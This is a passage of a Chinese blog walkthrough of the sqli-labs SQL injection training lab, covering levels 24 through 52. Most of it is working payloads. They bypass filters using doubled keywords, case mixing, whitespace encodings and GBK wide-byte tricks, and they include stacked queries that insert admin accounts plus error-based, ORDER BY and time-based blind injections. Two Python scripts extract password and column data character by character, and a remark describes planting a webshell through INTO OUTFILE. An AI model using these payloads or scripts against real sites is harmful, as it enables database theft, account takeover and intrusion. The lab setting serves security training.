<p>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</blockquote>
<p>正常用户admin可以正常登录，但是这里需要注册一个非正常的恶意用户，向数据库中插入恶意数据，来修个正常用户admin的密码</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin’<span class="hljs-meta"># </span>
<span class="hljs-symbol">password:</span> 任意</code></pre>

<p>注册完后可以使用该账号登录</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507091708950.png" alt="image-20210507091708950"></p>
<p>登录后可以更改用户的密码，此时可以随意修改密码，那么admin用户的密码就会被改成改密码</p>
<p>看看源码，分析原理</p>
<pre><code class="hljs PHP"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;
<span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</code></pre>

<p>将用户名和密码带入</p>
<pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> #<span class="hljs-string">&#x27; and password=&#x27;</span>$curr_pass<span class="hljs-string">&#x27; &quot;;</span></code></pre>

<p>可以看到真正的sql语句为</p>
<pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">UPDATE</span> users <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre>

<p>这杨就导致了admin用户密码被改变。</p>
<h2 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h2><p>这一关尝试可以发现，是将or和and替换成空</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093512147.png" alt="image-20210507093512147"></p>
<p>但是可以直接使用双写绕过，因为它只过滤了一次</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210507093742004.png" alt="image-20210507093742004"></p>
<p>所以还是可以使用union注入，就是要注意or和and单词需要双写。</p>
<h2 id="level25a"><a href="#level25a" class="headerlink" title="level25a"></a>level25a</h2><p>这一关和上一关一样是过滤了or和and，可以使用双写绕过，但是需要使用盲注</p>
<p>可以使用level8使用的脚本，对其payload稍加修改即可</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot;</span>

flag = <span class="hljs-string">&quot;&quot;</span>
t = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">sum</span>=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        <span class="hljs-comment"># payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid)</span>
        payload = <span class="hljs-string">&quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)

        response = requests.get(url+payload)
        t = response.text
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    <span class="hljs-comment"># print(mid)</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)</code></pre>



<h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><p>26与上一关相比，很类似，空格，注释符和 &#x2F; 也给过滤了</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507094649645.png" alt="image-20210507094649645" style="zoom:50%;">

<p>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
<pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TAB键（水平）
<span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行
<span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页
<span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return功能
<span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TAB键（垂直）
<span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</code></pre>

<p>可以使用报错注入或者盲注</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)&gt;&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>	
<span class="hljs-attribute">0</span>&#x27;||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(Select%<span class="hljs-number">0</span>a@@version),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span></code></pre>

<h2 id="level26a"><a href="#level26a" class="headerlink" title="level26a"></a>level26a</h2><p>与上一关一样，题目提示空格与注释被过滤了，可以使用<code>%a0</code>绕过，报错注入不出，可以用布尔盲注</p>
<pre><code class="hljs perl"><span class="hljs-number">0</span><span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>	<span class="hljs-comment">#探测为&#x27;</span>
<span class="hljs-number">0</span><span class="hljs-string">&#x27;||left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;%26%26&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>

白盒审计知道是<span class="hljs-string">&#x27;)</span>
<span class="hljs-string">0%27)%a0union%a0select%a01,database(),2||(&#x27;</span><span class="hljs-number">1</span>
<span class="hljs-number">0</span>%27)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>;%00</code></pre>

<h2 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h2><p>题目提示<code>union</code>与<code>select</code>被过滤了，但是没有使用<code>preg_ireplace()</code>,所以可用大小写绕过</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095131602.png" alt="image-20210507095131602" style="zoom:50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>
<span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span>

<span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A1,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre>

<h2 id="level27a"><a href="#level27a" class="headerlink" title="level27a"></a>level27a</h2><p>与27关基本一样，就是在id参数位置没有使用单引号闭合</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095515296.png" alt="image-20210507095515296"></p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095524859.png" alt="image-20210507095524859"></p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A1,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre>

<h2 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h2><p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可，注意这里的id闭合方式为<code>(&#39;&#39;)</code></p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095639166.png" alt="image-20210507095639166" style="zoom:50%;">

<pre><code class="hljs matlab"><span class="hljs-number">0</span>&#x27;)||left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">%00</span></code></pre>

<h2 id="level28a"><a href="#level28a" class="headerlink" title="level28a"></a>level28a</h2><p>与28关相比，简单很多，只是过滤了<code>union select</code>,所以可以继续使用上面的payload</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095853009.png" alt="image-20210507095853009" style="zoom:50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;)||left((database()),<span class="hljs-number">1</span>)=&#x27;s&#x27;;%<span class="hljs-number">00</span>
<span class="hljs-attribute">0</span>&#x27;)||left((selEct%<span class="hljs-number">0</span>agroup_concat(schema_name)%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata),<span class="hljs-number">1</span>)&lt;&#x27;s&#x27;;%<span class="hljs-number">00</span></code></pre>

<h2 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h2><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&amp;id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p>
<pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h2><p>与 29 架构一样，原理一致只不过加了<code>&quot;</code>限制</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre>

<h2 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h2><p>架构一样，多了<code>&quot;)</code></p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre>

<h2 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h2><p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p>
<p>宽字节注入</p>
<p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
<p>先了解一下这些字符的url编码：</p>
<p><img src="https://segmentfault.com/img/bVbzjiJ" alt="image.png"></p>
<p>当输入单引号，经addslashes转义后，对应的url编码是：<br><strong>‘ –&gt; &#39; –&gt; %5C%27</strong><br>当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：<br><strong>%df –&gt; %df \ ‘ –&gt; （%df%5C）%27</strong></p>
<p>若使用gbk编码的话，**%df%5C会被当作一个汉字处理**，从而使%27（单引号）逃出生天，成功绕过</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>
<span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h2><p>与32相同</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre>

<h2 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h2><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16&#x2F;utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre>



<h2 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h2><p>GET型宽字节注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
<p>payload:</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h2><p>直接使用32关的payload</p>
<pre><code class="hljs n1ql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)--+</code></pre>

<h2 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h2><p>和less-34一样</p>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>�&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#
<span class="hljs-attribute">Password</span>: 任意</code></pre>



<h2 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h2><p>堆叠注入：可以执行多条语句，用分号间隔</p>
<p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的</p>
<p>可以使用create创建一张表</p>
<pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;;create <span class="hljs-built_in">table</span> test like users;<span class="hljs-comment">%23</span></code></pre>

<p>也可以向数据包中插入一条数据</p>
<pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h2 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h2><p>和38一样，只不过这里是数字型，无需闭合。</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h2><p>闭合方式不同而已</p>
<p>payload</p>
<pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h2 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h2><p>数字型注入与39关相同</p>
<pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h2><p>与之前几关类似，不过这里的username位置进过滤，所以需要password位置进行堆叠注入</p>
<p>payload</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<p>点击登录后，会发现登录失败，但是inert语句已经被执行了，可以使用admin123账号直接登录</p>
<h2 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h2><p>与42的闭合方式不同</p>
<p>使用的是<code>(&#39;&#39;)</code></p>
<p>payload</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h2><p>与42相同</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h2><p>与43相同</p>
<pre><code class="hljs n1ql">Username：usnn
Password：1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre>

<h2 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h2><p><code>order by</code>注入</p>
<p><code>username</code>、<code>password</code>均为列名，所以以下需要知道列名</p>
<pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">null</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> username <span class="hljs-keyword">else</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">end</span>)
?<span class="hljs-keyword">order</span>=ifnull(<span class="hljs-keyword">null</span>, username)
?<span class="hljs-keyword">order</span>=rand(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)    //<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(<span class="hljs-number">1</span>)/rand(<span class="hljs-number">0</span>)两者返回不一样
?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> regexp <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x00</span>))</code></pre>

<p>将<code>1=1</code>换成bool盲注的语句函数即可用于获取数据<br><code>sort=rand(ascii(database(),1))=115)</code></p>
<p>时间盲注</p>
<pre><code class="hljs pgsql">sort=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))
sort=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(substring(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-type">char</span>(<span class="hljs-number">115</span>),benchmatrk(<span class="hljs-number">5000000</span>,md5(<span class="hljs-string">&#x27;1&#x27;</span>)),<span class="hljs-keyword">null</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1)</code></pre>

<p>Bool 盲注</p>
<pre><code class="hljs pgsql">rand(ascii(left(<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)</code></pre>

<p>报错注入：</p>
<pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)
(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,floor(rand()*<span class="hljs-number">2</span>)))</code></pre>

<p>procedure analyse 参数后注入</p>
<pre><code class="hljs delphi">sort=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title">concat</span><span class="hljs-params">(0x3a,version()</span>)),1)</span></code></pre>

<p>into outfile参数:</p>
<pre><code class="hljs abnf"><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> into outfield <span class="hljs-string">&quot;path&quot;</span></code></pre>

<p>上传网马，可以在后面加上<code>lines terminated by 16</code>进制转码的数据</p>
<h2 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h2><p>与46的闭合防止不用，使用报错注入</p>
<pre><code class="hljs n1ql">?sort=1&#x27; and extractvalue(1,concat(0x7e,( <span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))--+</code></pre>

<h2 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h2><p>使用时间盲注</p>
<pre><code class="hljs lisp"><span class="hljs-number">1</span> and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
sort=rand(<span class="hljs-name">ascii</span>(<span class="hljs-name">left</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>))=115)</code></pre>

<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&#x27;http://127.0.0.1/Less-48/</span>
<span class="hljs-string">payloads = &#x27;</span>QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_<span class="hljs-string">&#x27;</span>
<span class="hljs-string">data = &#x27;</span><span class="hljs-string">&#x27;</span>
<span class="hljs-string">for i in range(50):</span>
<span class="hljs-string">    for j in payloads:</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span>
<span class="hljs-string">        payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;       </span>
<span class="hljs-string">        try:</span>
<span class="hljs-string">            r = requests.get(url+payload, timeout=1)</span>
<span class="hljs-string">        except Exception:</span>
<span class="hljs-string">            data += j</span>
<span class="hljs-string">            print(data)</span>
<span class="hljs-string">            break</span></code></pre>

<h2 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h2><p>与47的闭合方式不同，但是可以使用盲注</p>
<pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+
<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>((<span class="hljs-params">select</span> <span class="hljs-params">username</span> <span class="hljs-params">from</span> <span class="hljs-params">users</span> <span class="hljs-params">where</span> <span class="hljs-params">id</span>=1)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))--+</code></pre>

<h2 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h2><p>order by与堆叠注入结合，数字型</p>
<p>payload:</p>
<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507103942074.png" alt="image-20210507103942074" style="zoom:50%;">



<h2 id="level51"><a href="#level51" class="headerlink" title="level51"></a>level51</h2><p>与50关相比增加单引号闭合</p>
<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h2><p>与50相同</p>
